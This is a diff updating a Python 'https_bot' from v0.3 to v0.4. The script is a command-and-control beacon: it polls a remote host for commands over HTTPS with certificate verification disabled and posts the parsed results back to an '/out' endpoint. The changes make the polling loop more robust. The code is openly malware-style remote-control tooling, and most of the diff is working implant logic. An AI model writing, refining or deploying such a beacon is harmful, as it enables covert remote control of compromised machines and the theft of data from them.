@@ -1,4 +1,4 @@
-#https_bot v0.3
+#https_bot v0.4
 import requests
 import logging
 import subprocess
@@ -7,17 +7,18 @@ from optparse import OptionParser
 
 def beacon(host, seconds):
   time.sleep(int(seconds))
-  fetch = request(host)
-  output = parse(fetch)
-  send(host, output)
+  fetch, content = request(host)
+  if str(fetch) == "<Response [200]>":
+    output = parse(content)
+    send(host, output)
   
 def send(host, output):
-  response = requests.post('https://'+host+'/', data=output, verify=False)
+  response = requests.post('https://'+host+'/out', data=output, verify=False)
   return response 
 
 def request(host):
   response = requests.get('https://'+host+'/command', verify=False)
-  return response.text
+  return response, response.text
 
 def request_certs(host, pcert, key):
   response = requests.get('https://'+host, verify=False, cert=(pcert, key))
